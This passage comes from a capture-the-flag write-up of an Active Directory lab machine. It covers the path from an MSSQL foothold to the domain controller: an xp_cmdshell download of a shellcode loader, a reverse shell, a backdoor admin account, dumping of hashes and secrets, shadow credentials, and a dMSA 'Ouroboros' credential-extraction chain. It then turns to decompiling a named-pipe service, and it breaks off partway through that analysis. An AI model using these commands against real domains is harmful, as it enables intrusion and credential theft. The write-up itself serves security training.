Generated loader.go (117436 bytes shellcode)

$ GOOS=windows GOARCH=amd64 go build -o p.exe -ldflags "-s -w" loader.go
```

Finally, before we start the chain, we will add a listener on port `4444` through our `ligolo` tunnel, and on port `80` for our web server to be accessible.

```shell
[Agent : root@odyssey-web] » listener_add --tcp --to 192.168.1.94:4444 --addr 0.0.0.0:4444
INFO[45391] Listener 1 created on remote agent!
[Agent : root@odyssey-web] » listener_add --tcp --to 192.168.1.94:80 --addr 0.0.0.0:80
INFO[45471] Listener 2 created on remote agent!
```

Now using `xp_cmdshell`, we will download the loader and the reverse shell binary. After setting up our listener on `4444`, we will execute the loader and get access on `odyssey-db` as SYSTEM.

```shell
SQL (ODYSSEY\svc-mssql  dbo@master)> EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://172.16.0.12/s.exe -OutFile C:/Users/Public/s.exe"';                                   
output
------
NULL

SQL (ODYSSEY\svc-mssql  dbo@master)> EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://172.16.0.12/p.exe -OutFile C:/Users/Public/p.exe"';                                   
output
------
NULL

SQL (ODYSSEY\svc-mssql  dbo@master)> EXEC xp_cmdshell 'C:/Users/Public/p.exe';

$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.1.94] from (UNKNOWN) [192.168.1.94] 49222
whoami
nt authority\system
PS C:\> 
```

We can grab the `user` flag located in `C:\Users\Administrator\Desktop\user.txt`.

```powershell
PS C:\> type C:\Users\Administrator\Desktop\user.txt
<REDACTED>
```

# Lateral Movement - Access to DC01

## AddKeyCredentialLink to svc-aegis-build

Before we continue, to make our workflow easier, we will create a user we control and grant it access to log in through `winrm`.

```powershell
PS C:\> net user rogue Password1 /add
PS C:\> net localgroup Administrators rogue /add
PS C:\> powershell Add-LocalGroupMember -Group 'Remote Management Users' -Member rogue
```

```shell
$ evil-winrm -i 172.16.0.11 -u rogue -p Password1                    
Evil-WinRM shell v3.7
*Evil-WinRM* PS C:\Users\rogue\Documents> 
```

Now we will proceed to dump the `sys`, `sec`, and `sam` registry hives, download them locally, and extract the local hashes.

```shell
$ impacket-secretsdump LOCAL -system sys.save -security sec.save -sam sam.save 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x2a96bead981fcdc2acd55f27c6aef09a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:09b463b3dec18b47a66c8b29e8ab187a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
rogue:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Dumping cached domain logon information (domain/username:hash)
ODYSSEY.HTB/svc-mssql:$DCC2$10240#svc-mssql#9711ac11a96646823b1d3726c16a388a: (2026-05-12 17:59:53+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:5c005e005e002a006c003e006c00230031003000490021005b0058006d00210053006e00350074002c0069006b003f006300390069005f003a00790042003a006400300039005c0047003a00560079007a00320022003f0049006b006e0051002a00300021005f0061005e007a0067006b006a006f003a005f00490079006d002c00750066002500440052005e00670052004a0067003600540028005f004000200048004f0026002400540073006d004b004e002900690024005d00320031002200260072005700250077003a0027005f005e004e004c0042004300220070006800420050002f003800220022005a00
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:71bc6be8565f0c9871070c3912b1680d
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xd67b95188725a1dbbc68ca213aea9a841336a946
dpapi_userkey:0xfb545a8b628536e7ec77b39841194d6ef2eb1075
[*] NL$KM 
 0000   64 49 1F 7E DE 2D 8F CA  ED 68 E6 AB A0 3B CF 62   dI.~.-...h...;.b
 0010   06 71 DF AC E8 74 CB 9A  21 F0 F5 1B EA 14 BE E9   .q...t..!.......
 0020   DE AE 62 6E 88 E5 47 49  29 48 B1 20 E8 4A 76 09   ..bn..GI)H. .Jv.
 0030   A0 F5 B6 F4 DD 72 04 82  F9 E6 FA CA 97 D5 3D BF   .....r........=.
NL$KM:64491f7ede2d8fcaed68e6aba03bcf620671dface874cb9a21f0f51bea14bee9deae626e88e547492948b120e84a7609a0f5b6f4dd720482f9e6faca97d53dbf
[*] _SC_MSSQLSERVER 
(Unknown User):cml958782
[*] Cleaning up...
```

The only valuable credential set we retrieve from the extraction is the machine account's hash.

```shell
$ nxc smb 172.16.0.10 -u "ODYSSEY-DB$" -H "71bc6be8565f0c9871070c3912b1680d" 
SMB         172.16.0.10     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:odyssey.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.0.10     445    DC01             [+] odyssey.htb\ODYSSEY-DB$:71bc6be8565f0c9871070c3912b1680d
```

Performing analysis on the account in `Bloodhound`, we can see that it has the `addKeyCredentialLink` edge attached to the `svc-aegis-build` user through a lengthy group membership inheritance.

![](Odyssey.assets/bloodhound_1.png)

We will use `Certipy` to retrieve the `NT` hash of the `svc-aegis-build` user.

```shell
$ certipy-ad shadow auto -u 'ODYSSEY-DB$@odyssey.htb' -hashes ':71bc6be8565f0c9871070c3912b1680d' -account svc-aegis-build -dc-ip 172.16.0.10
/usr/lib/python3/dist-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'svc-aegis-build'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'cf602336-8683-ab31-0260-57b7ae3d013a'
[*] Adding Key Credential with device ID 'cf602336-8683-ab31-0260-57b7ae3d013a' to the Key Credentials for 'svc-aegis-build'
[*] Successfully added Key Credential with device ID 'cf602336-8683-ab31-0260-57b7ae3d013a' to the Key Credentials for 'svc-aegis-build'
[*] Authenticating as 'svc-aegis-build' with the certificate
[*] Using principal: svc-aegis-build@odyssey.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'svc-aegis-build.ccache'
[*] Trying to retrieve NT hash for 'svc-aegis-build'
[*] Restoring the old Key Credentials for 'svc-aegis-build'
[*] Successfully restored the old Key Credentials for 'svc-aegis-build'
[*] NT hash for 'svc-aegis-build': bbc270509ec878cf516d5295fb4d774

$ nxc smb 172.16.0.10 -u "svc-aegis-build" -H "bbc270509ec878cf516d5295fb4d774d"
SMB         172.16.0.10     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:odyssey.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.0.10     445    DC01             [+] odyssey.htb\svc-aegis-build:bbc270509ec878cf516d5295fb4d774d
```

## dMSA Ouroboros Chain - Access at DC01 with svc-aegis-deploy user

In our instance of `Bloodhound`, `svc-aegis-build` does not seem to have any interesting permissions. We will use `bloodyAD` to enumerate further.

```shell
$ bloodyAD --host 172.16.0.10 -d odyssey.htb -u svc-aegis-build -p :bbc270509ec878cf516d5295fb4d774d get writable --otype ALL --right ALL --detail
<SNIP>
distinguishedName: OU=Migrations,DC=odyssey,DC=htb
msDS-DelegatedManagedServiceAccount: CREATE_CHILD

distinguishedName: CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb
msDS-SupersededManagedAccountLink: WRITE
msDS-SupersededServiceAccountState: WRITE
```

The query returns some very interesting results. Searching the web with those properties returns a plethora of results regarding the now-patched original `BadSuccessor` attack chain that affected Server 2025. Since the target server is fully patched as of the date, we know (and can verify with testing) that the original `BadSuccessor` exploit does not work.

Among the results of our search is an amazing research article by [Huntress](https://www.huntress.com/blog/dmsa-ouroboros-credential-extraction-windows-server-2025). We won't go into much detail on what is different here, since the authors of this article did an excellent job of explaining their research. We highly recommend that you read it to fully understand how the post-BadSuccessor-patched Server 2025 is still vulnerable to `dMSA` misuse. 

In short: since `CVE-2025-53779's` fix only validates that both links exist (not who wrote them), an attacker with `CreateChild` + `WriteProperty` on the target's migration-link attributes can satisfy the bidirectional validation and still extract credentials. The "Ouroboros" twist is that the `dMSA` is enrolled in its own `msDS-GroupMSAMembership`, creating a self-sustaining loop in which the `dMSA` authorizes its own credential retrieval.

The first step is to create the `dMSA` bi-directional link. `BloodyAD`'s `add badSuccessor` without the `--prepatch` flag does what we want. It is important to note that the `dMSA` account name must be no more than 20 characters. `dMSA's` use `userAccountControl = WORKSTATION_TRUST_ACCOUNT`, which requires `sAMAccountName` to end with `$`. Total length must be <=20 characters, otherwise the request will be rejected with `ERROR_INVALID_ACCOUNT_NAME`.

```shell
$ bloodyAD --host 172.16.0.10 -d odyssey.htb -u svc-aegis-build -p :bbc270509ec878cf516d5295fb4d774d add badSuccessor dmsa-pipe-deploy -t 'CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb' --ou 'OU=Migrations,DC=odyssey,DC=htb'

[+] Creating DMSA dmsa-pipe-deploy$ in OU=Migrations,DC=odyssey,DC=htb
[+] Impersonating: CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb
[-] Failed to retrieve dMSA TGT
[-] Try using Rubeus, or something like:
[-] badS4U2self 'kerberos+nt://odyssey.htb\svc-aegis-build:bbc270509ec878cf516d5295fb4d774d@172.16.0.10/' 'krbtgt/odyssey.htb@odyssey.htb' 'dmsa-pipe-deploy$@odyssey.htb' --dmsa 
<SNIP>
```

The `KDC_ERR_ETYPE_NOTSUPP` received is expected and is not an issue. The `LDAP` operations we wanted succeeded.

Now, we need to grant `GenericAll` on the `dMSA`.

```shell
$ bloodyAD --host 172.16.0.10 -d odyssey.htb -u svc-aegis-build -p :bbc270509ec878cf516d5295fb4d774d add genericAll 'CN=dmsa-pipe-deploy,OU=Migrations,DC=odyssey,DC=htb' svc-aegis-build
[+] svc-aegis-build has now GenericAll on CN=dmsa-pipe-deploy,OU=Migrations,DC=odyssey,DC=htb
```

Now, we will add the `X.509 certificate` to `dmsa-pipe-deploy$`. As explained in the `Huntress` article, the `dMSA's` `defaultSecurityDescriptor` includes explicit deny rules for password read and password change, but does not restrict writes to `msDS-KeyCredentialLink`. So, despite `dMSAs'` design to use managed passwords exclusively, an attacker with `WriteDacl/GenericAll` can plant a certificate for `PKINIT` - an authentication path that bypasses managed password rotation entirely.

```shell
$ certipy-ad shadow add -u svc-aegis-build -hashes ":bbc270509ec878cf516d5295fb4d774d" -account "dmsa-pipe-deploy$" -dc-ip 172.16.0.10

Certipy v4.8.2 - by Oliver Lyak (ly4k)
[*] Targeting user 'dmsa-pipe-deploy$'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '51a1abf5-4358-3ab9-3f4d-bf29c56e9aa3'
[*] Adding Key Credential with device ID '51a1abf5-4358-3ab9-3f4d-bf29c56e9aa3' to the Key Credentials for 'dmsa-pipe-deploy$'
[*] Successfully added Key Credential with device ID '51a1abf5-4358-3ab9-3f4d-bf29c56e9aa3' to the Key Credentials for 'dmsa-pipe-deploy$'
[*] Saved certificate and private key to 'dmsa-pipe-deploy.pfx'
```

Next, we create the security descriptor. `dMSA's` `KERB-DMSA-KEY-PACKAGE` is gated by `msDS-GroupMSAMembership` - a security descriptor that controls who can request the `dMSA's` credential package. The original `badSuccessor` chain wrote this descriptor with only the attacker's `SID`. But the Ouroboros self-authorization requires the `dMSA's` own `SID` - the `dMSA` must be allowed to request its own credentials.

First, we need to grab the `SIDs` of the `dMSA` account and the `svc-aegis-build` user.

```shell
$ bloodyAD --host 172.16.0.10 -d odyssey.htb -u svc-aegis-build -p :bbc270509ec878cf516d5295fb4d774d get object 'dmsa-pipe-deploy$' --attr objectSid

distinguishedName: CN=dmsa-pipe-deploy,OU=Migrations,DC=odyssey,DC=htb
objectSid: S-1-5-21-4175332977-3571604968-1809176562-12601

$ bloodyAD --host 172.16.0.10 -d odyssey.htb -u svc-aegis-build -p :bbc270509ec878cf516d5295fb4d774d get object 'svc-aegis-build' --attr objectSid

distinguishedName: CN=svc-aegis-build,OU=Pipeline,DC=odyssey,DC=htb
objectSid: S-1-5-21-4175332977-3571604968-1809176562-6101
```

Now, we can create the security descriptor and write it. We reference the `Huntress` article on the design decisions for creating the security descriptor.

```python
# create_SD.py   
from winacl.dtyp.security_descriptor import SECURITY_DESCRIPTOR
import base64
dmsa_sid = "S-1-5-21-4175332977-3571604968-1809176562-12601"
attacker_sid = "S-1-5-21-4175332977-3571604968-1809176562-6101"
sddl = f"O:SYD:(A;;0xf01ff;;;{dmsa_sid})(A;;0xf01ff;;;{attacker_sid})"
sd = SECURITY_DESCRIPTOR.from_sddl(sddl)
print(base64.b64encode(sd.to_bytes()).decode())
```

```shell
$ python3 create_SD.py                                                       
AQAEgBQAAAAAAAAAAAAAACAAAAABAQAAAAAABRIAAAACAFAAAgAAAAAAJAD/AQ8AAQUAAAAAAAUVAAAAcYbe+Ohd4tTy19VrOTEAAAAAJAD/AQ8AAQUAAAAAAAUVAAAAcYbe+Ohd4tTy19Vr1RcAAA==

$ bloodyAD --host 172.16.0.10 -d odyssey.htb -u svc-aegis-build -p :bbc270509ec878cf516d5295fb4d774d set object 'dmsa-pipe-deploy$' msDS-GroupMSAMembership --raw --b64 -v 'AQAEgBQAAAAAAAAAAAAAACAAAAABAQAAAAAABRIAAAACAFAAAgAAAAAAJAD/AQ8AAQUAAAAAAAUVAAAAcYbe+Ohd4tTy19VrOTEAAAAAJAD/AQ8AAQUAAAAAAAUVAAAAcYbe+Ohd4tTy19Vr1RcAAA=='
[+] dmsa-pipe-deploy$'s msDS-GroupMSAMembership has been updated
```

Finally, we can perform the `S4U2Self` chain and retrieve the hash of the `svc-aegis-deploy` user.

```shell
$ certipy-ad auth -pfx dmsa-pipe-deploy.pfx -dc-ip 172.16.0.10 -username 'dmsa-pipe-deploy$' -domain odyssey.htb

Certipy v4.8.2 - by Oliver Lyak (ly4k)
[!] Could not find identification in the provided certificate
[*] Using principal: dmsa-pipe-deploy$@odyssey.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'dmsa-pipe-deploy.ccache'
[*] Trying to retrieve NT hash for 'dmsa-pipe-deploy$'
[*] Got hash for 'dmsa-pipe-deploy$@odyssey.htb': aad3b435b51404eeaad3b435b51404ee:7641fccce7d70473e575a6d7e9c7df49

$ badS4U2self 'kerberos+ccache://odyssey.htb\dmsa-pipe-deploy$:dmsa-pipe-deploy.ccache@172.16.0.10' 'krbtgt/odyssey.htb@odyssey.htb' 'dmsa-pipe-deploy$@odyssey.htb' --dmsa
[+] Trying to get SPN with dmsa-pipe-deploy$
[+] Success!

Realm        : ODYSSEY.HTB
Sname        : krbtgt/ODYSSEY.HTB
UserName     : dmsa-pipe-deploy$
UserRealm    : odyssey.htb
StartTime    : 2026-05-14 12:39:14+00:00
EndTime      : 2026-05-14 22:32:06+00:00
RenewTill    : 2026-05-15 12:32:09+00:00
Flags        : forwardable, enc-pa-rep, renewable, pre-authent
Keytype      : 18
Key          : bW1kaID0fZhKGRNq8NcfnZrECIDjiHy0JlVQXRPGh+U=
EncodedKirbi 
<SNIP>
dMSA current keys found in TGS:
AES256: c03bc7e6c29f32d598838fc42518a3fbbb799218cc430469ec5df7a007e0f328
AES128: 0c20419c4f1747b07b6b9ee15d26f110
RC4: 7641fccce7d70473e575a6d7e9c7df49

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa

$ nxc smb 172.16.0.10 -u "svc-aegis-deploy" -H "3a5026b2aa5ef2cbb7cb6a7be3a2bcfa"
SMB         172.16.0.10     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:odyssey.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.0.10     445    DC01             [+] odyssey.htb\svc-aegis-deploy:3a5026b2aa5ef2cbb7cb6a7be3a2bcfa
```

# Privilege Escalation

## HMAC-Gated YAML Deserialization

### Read the Operator key through a Decryption Oracle

`svc-aegis-deploy` is a member of the `Remote Management Users` group, and we can gain access to the `DC01` server via `WinRM`. During manual enumeration, we found out that we cannot run commands that query services. We then shifted our focus to the registry to get service data. During this operation, we enumerated the following service.

```shell
*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> reg query "HKLM\SYSTEM\CurrentControlSet\Services\AegisStreamCollector" /v ImagePath

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AegisStreamCollector
    ImagePath    REG_EXPAND_SZ    C:\Program Files\Aegis Stream Collector\AegisStreamSvc.exe

*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> reg query "HKLM\SYSTEM\CurrentControlSet\Services\AegisStreamCollector" /v ObjectName

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AegisStreamCollector
    ObjectName    REG_SZ    ODYSSEY\svc-aegis-stream
```

In `Bloodhound`, we can see that the `svc-aegis-stream` user has `DCSync` rights, making the account a high value target.

![](Odyssey.assets/bloodhound_2.png)

Visiting the application's directory, we can list the application's files, and we find out that it uses `YamlDotNet`.

```shell
Mode                 LastWriteTime         Length Name 
----                 -------------         ------ ----                                                       
-a----          5/8/2026  12:44 PM          13824 AegisStream.Common.dll
-a----          5/9/2026  12:00 AM          30561 AegisStreamSvc.deps.json
<SNIP>
-a----          5/8/2026   4:09 PM         235520 YamlDotNet.dll
```

Since this is a `.NET` project, we will download it locally and decompile it to view the source code. We used `dnSPY` for this purpose. We will start our analysis with `AegisStreamWatchdog`, since it has the smallest codebase.

In `program.cs`, we can see what workers are registered to run.

```c#
internal class Program
{
	// Token: 0x06000001 RID: 1 RVA: 0x00002048 File Offset: 0x00000248
	private static void <Main>$(string[] args)
	{
		HostApplicationBuilder hostApplicationBuilder = Host.CreateApplicationBuilder(args);
		WindowsServiceLifetimeHostBuilderExtensions.AddWindowsService(hostApplicationBuilder.Services, delegate(WindowsServiceLifetimeOptions options)
		{
			options.ServiceName = "AegisStreamWatchdog";
		});
		hostApplicationBuilder.Services.AddHostedService<WatchdogWorker>();
		IHost host = hostApplicationBuilder.Build();
		host.Run();
	}
}
```

The only registered worker here is `WatchdogWorker`, so we will proceed with analyzing `WatchdogWorker.js`.

```c#
		protected override Task ExecuteAsync(CancellationToken ct)
		{
			WatchdogWorker.<ExecuteAsync>d__3 <ExecuteAsync>d__;
			<ExecuteAsync>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<ExecuteAsync>d__.<>4__this = this;
			<ExecuteAsync>d__.ct = ct;
			<ExecuteAsync>d__.<>1__state = -1;
			<ExecuteAsync>d__.<>t__builder.Start<WatchdogWorker.<ExecuteAsync>d__3>(ref <ExecuteAsync>d__);
			return <ExecuteAsync>d__.<>t__builder.Task;
		}
```

The actual loop body lives inside the compiler-generated `<ExecuteAsync>d__3` struct, which the decompiler didn't render - but the field at the bottom of the class tells us everything:

```c#
// Token: 0x04000007 RID: 7
		private static readonly TimeSpan ScanInterval = TimeSpan.FromMinutes(5.0);
```

Combined with  `RunIntegrityScan()` being the only method in the class, the loop is unambiguously:

```c#
while (!ct.IsCancellationRequested)
{
	RunIntegrityScan()
	await Task.Delay(ScanInterval, ct);
}
```

Now, we will work through `RunIntegrityScan`.

```c#
if (!File.Exists("C:\\ProgramData\\AegisStream\\config\\watchdog.manifest"))
{
  this._log.LogWarning("manifest absent at {p}; skipping scan", new object[]
  {
    "C:\\ProgramData\\AegisStream\\config\\watchdog.manifest"
  });
  return;
}
```

There is a hardcoded `manifest` file in `C:\ProgramData\AegisStream\config`. If the file is not there, the worker just logs a warning and keeps polling every 5 minutes. Let's see if we have access to this manifest and which user is running this service.

```shell
*Evil-WinRM* PS C:\Program Files\Aegis Stream Collector> reg query "HKLM\SYSTEM\CurrentControlSet\Services\AegisStreamWatchdog" /v ObjectName

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AegisStreamWatchdog
    ObjectName    REG_SZ    ODYSSEY\svc-aegis-watch
    
*Evil-WinRM* PS C:\Program Files\Aegis Stream Collector> type "C:\\ProgramData\\AegisStream\\config\\watchdog.manifest"
{
		"Files":  [
    							{
                  		"Sha256":  "f37a3453a07f46e8572e2eacb449f1412c4a2a680cad02833abdab904c9f3483",
                      "Path":  "C:\\Program Files\\Aegis Stream Collector\\AegisStream.Common.dll"
                  },
                  {
                  		"Sha256":  "391cd5a5ba15965a1d9634ad5c6ed8ca34a77be8931b9fea5112d33dc70a8272",
                      "Path":  "C:\\Program Files\\Aegis Stream Collector\\AegisStreamSvc.deps.json"
                  },
                  {
                  		"Sha256":  "47850a8d9fb5ebaa248c6fc18053ee61bc6fc4e84c2071eb5b194cf622e94db1",
                      "Path":  "C:\\Program Files\\Aegis Stream Collector\\AegisStreamSvc.dll"            
    <SNIP>
                  {
                      "Sha256":  "f25d0f33fc11c6d2a37dd399fbcdf5d3299da2afac52e08a404bc815078ad57c",
                      "Path":  "C:\\ProgramData\\AegisStream\\keys\\viewer.key"
                  },
                  {
                      "Sha256":  "014eab44f0b3fd7fb7674691e5f31422d6549a28c2e0fad5ec8e28ab6192f403",
                      "Path":  "C:\\ProgramData\\AegisStream\\keys\\auditor.key"
                  },
                  {
                      "Sha256":  "4e0325dc9ee6523039b2f34a2aa8b8a6139e20d61983bc2591ad95249c1c78bc",
                      "Path":  "C:\\ProgramData\\AegisStream\\keys\\operator.key.enc"
                  },
                  {
                      "Sha256":  "e85b29542f7e7cc20568eb8268bc2fe1f6ea102f75568bfe103211929d08b814",
                      "Path":  "C:\\ProgramData\\AegisStream\\dpapi\\operator.wrap.bin"
```

The application is running under the `svc-aegis-watch` user context. The manifest contains file paths and their corresponding `SHA-256` values. Most of the files in here are the application files we have already downloaded. At the bottom of the manifest, we find four files that appear to be keys, located in the `C:\ProgramData\AegisStream\keys` and `C:\ProgramData\AegisStream\dpapi` folders. Interestingly, we can read these files, except for the operator key, even though they seem related to `AegisStream`.

```shell
*Evil-WinRM* PS C:\Program Files\Aegis Stream Collector> icacls "C:\\ProgramData\\AegisStream\\keys\\viewer.key"
C:\\ProgramData\\AegisStream\\keys\\viewer.key NT AUTHORITY\SYSTEM:(F)
                                               BUILTIN\Administrators:(F)
                                               ODYSSEY\svc-aegis-stream:(F)
                                               ODYSSEY\AegisStream-Viewers:(R)

Successfully processed 1 files; Failed processing 0 files
*Evil-WinRM* PS C:\Program Files\Aegis Stream Collector> icacls "C:\\ProgramData\\AegisStream\\keys\\operator.key.enc"
C:\\ProgramData\\AegisStream\\keys\\operator.key.enc NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     ODYSSEY\svc-aegis-stream:(I)(F)
                                                     ODYSSEY\AegisStream-Viewers:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
*Evil-WinRM* PS C:\Program Files\Aegis Stream Collector> icacls "C:\\ProgramData\\AegisStream\\dpapi\\operator.wrap.bin"
C:\\ProgramData\\AegisStream\\dpapi\\operator.wrap.bin NT AUTHORITY\SYSTEM:(I)(F)
                                                       BUILTIN\Administrators:(I)(F)
                                                       ODYSSEY\svc-aegis-stream:(I)(F)
                                                       ODYSSEY\AegisStream-Viewers:(I)(RX)
```

```shell
*Evil-WinRM* PS C:\Program Files\Aegis Stream Collector> whoami /all
USER INFORMATION
----------------
User Name                SID
======================== ==============================================
odyssey\svc-aegis-deploy S-1-5-21-4175332977-3571604968-1809176562-7101

<SNIP>
Group Name     Type     SID       Attributes
===========================================
Everyone     Well-known group S-1-1-0    Mandatory group, <SNIP>  ODYSSEY\AegisStream-Viewers                 Alias            S-1-5-21-4175332977-3571604968-1809176562-7606 Mandatory group,   <SNIP>
```

Our group membership explains why we have read access to these files. `svc-aegis-watch`, which is the account that runs the `watchdog` application, is part of the same group.

```shell
*Evil-WinRM* PS C:\Program Files\Aegis Stream Collector> net user svc-aegis-watch
User name                    svc-aegis-watch
Full Name                    Aegis Stream Watchdog Service
Comment                      Sov-Sec-22 stream-aggregator integrity watchdog service identity (D9-PIPE-37).
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never
<SNIP>
Local Group Memberships      *AegisStream-Viewers
Global Group memberships     *Domain Users
The command completed successfully.
```

If the `watchdog` app is performing any operation on these files that requires read access, we can be certain that excessive permissions are in place, granting the entire group read access to the keys (not specifically to `svc-aegis-watch`). If we follow the application's decompiled code:

```c#
foreach (ManifestEntry manifestEntry in manifest.Files)
			{
				if (!File.Exists(manifestEntry.Path))
				{
					num3++;
					this._log.LogWarning("[INTEGRITY] file missing: {p}", new object[]
					{
						manifestEntry.Path
					});
				}
				else
				{
					byte[] inArray;
					try
					{
						inArray = SHA256.HashData(File.ReadAllBytes(manifestEntry.Path));
					}
					catch (Exception exception)
					{
						this._log.LogWarning(exception, "[INTEGRITY] read failed: {p}", new object[]
						{
							manifestEntry.Path
						});
						continue;
					}
					string text = Convert.ToHexString(inArray).ToLowerInvariant();
					if (string.Equals(text, manifestEntry.Sha256, StringComparison.OrdinalIgnoreCase))
					{
						num++;
					}
					else
					{
						num2++;
						this._log.LogError("[TAMPER] {p} sha256 mismatch; expected {exp}, got {act}", new object[]
						{
							manifestEntry.Path,
							manifestEntry.Sha256,
							text
						});
					}
				}
			}
			this._log.LogInformation("integrity scan complete — {ok} ok / {mis} mismatched / {missing} missing (manifest schema {s}, generated {g})", new object[]
			{
				num,
				num2,
				num3,
				manifest.Schema,
				manifest.GeneratedUtc
			});
		}
```

We can conclude that this application checks whether any of these files have been tampered with and logs the results. There isn't much we can do with this application from an exploitation perspective, but at least we understand why we have the privileges to read the key `AegisStream`-related files. Let's proceed with analyzing the `AegisStreamSvc` application.

In `program.cs`:

```c#
	private static void <Main>$(string[] args)
	{
		HostApplicationBuilder hostApplicationBuilder = Host.CreateApplicationBuilder(args);
		WindowsServiceLifetimeHostBuilderExtensions.AddWindowsService(hostApplicationBuilder.Services, delegate(WindowsServiceLifetimeOptions options)
		{
			options.ServiceName = "AegisStreamCollector";
		});
		hostApplicationBuilder.Services.AddSingleton<KeyStore>();
		hostApplicationBuilder.Services.AddSingleton<TelemetryStore>();
		hostApplicationBuilder.Services.AddSingleton<ConfigManager>();
		hostApplicationBuilder.Services.AddHostedService<PipeServerWorker>();
		IHost host = hostApplicationBuilder.Build();
		host.Run();
	}
```

There's exactly one hosted service. That makes `PipeServerWorker` the entire functional surface - every behavior of this program has to go through there. We will continue with `PipeServerWorker.cs`.

Opening the class, two things are striking. First, the constructor pulls in everything we just saw registered.

```c#
		public PipeServerWorker(ILogger<PipeServerWorker> log, KeyStore keys, TelemetryStore telemetry, ConfigManager config)
		{
			this._log = log;
			this._keys = keys;
			this._telemetry = telemetry;
			this._config = config;
		}
```

So whatever this worker does is mediated by exactly those three collaborators. Second, the methods in the class are very telling. The decompiler shows only state-machine stubs for the async ones, but their signatures and names form an instantly legible map:

```
ExecuteAsync(ct)
CreatePipe()       → NamedPipeServerStream         [synchronous]
HandleClient(pipe, ct)
InferRoleFromSignature(frame) → Role               [synchronous, ours to read]
Dispatch(pipe, frame, ct)
HandleStreamList  (pipe, reqId, ct)
HandleStreamGet   (pipe, frame, ct)
HandleStreamMetrics (pipe, frame, ct)
HandleStreamReplay (pipe, frame, ct)
HandleDiagDecrypt  (pipe, frame, ct)
HandleConfigExport (pipe, reqId, ct)
HandleConfigImport (pipe, frame, ct)
HandleMaintReload  (pipe, reqId, ct)
Reply(pipe, reqId, status, body, ct)  [static]
```

 A static constructor builds a table called `MinRoles`:

```c#
static PipeServerWorker()
{
  Dictionary<string, Role> dictionary = new Dictionary<string, Role>(StringComparer.Ordinal);
  dictionary["STREAM_LIST"] = Role.Viewer;
  dictionary["STREAM_GET"] = Role.Viewer;
  dictionary["STREAM_METRICS"] = Role.Auditor;
  dictionary["STREAM_REPLAY"] = Role.Auditor;
  dictionary["DIAG_DECRYPT_TELEMETRY_BLOB"] = Role.Viewer;
  dictionary["CONFIG_EXPORT"] = Role.Operator;
  dictionary["CONFIG_IMPORT"] = Role.Operator;
  dictionary["MAINT_RELOAD"] = Role.Operator;
  PipeServerWorker.MinRoles = dictionary;
}
```

This looks like the outline of an authorization model - the keys are the eight opcodes the protocol speaks, and the values are the minimum required roles, for what seems to be a `PIPE` application. We'll come back to that. First, two things to nail down: what does a client connect to (the pipe) and what does a client send (the frame). 

Looking at the `CreatePipe` method:

```c#
private static NamedPipeServerStream CreatePipe()
		{
			PipeSecurity pipeSecurity = new PipeSecurity();
			pipeSecurity.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
			pipeSecurity.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
			foreach (string name in new string[]
			{
				"AegisStream-Viewers",
				"AegisStream-Auditors",
				"AegisStream-Operators"
			})
			{
				pipeSecurity.AddAccessRule(new PipeAccessRule(new NTAccount(name), PipeAccessRights.ReadData | PipeAccessRights.WriteData | PipeAccessRights.ReadAttributes | PipeAccessRights.WriteAttributes | PipeAccessRights.ReadExtendedAttributes | PipeAccessRights.WriteExtendedAttributes | PipeAccessRights.ReadPermissions | PipeAccessRights.Synchronize, AccessControlType.Allow));
			}
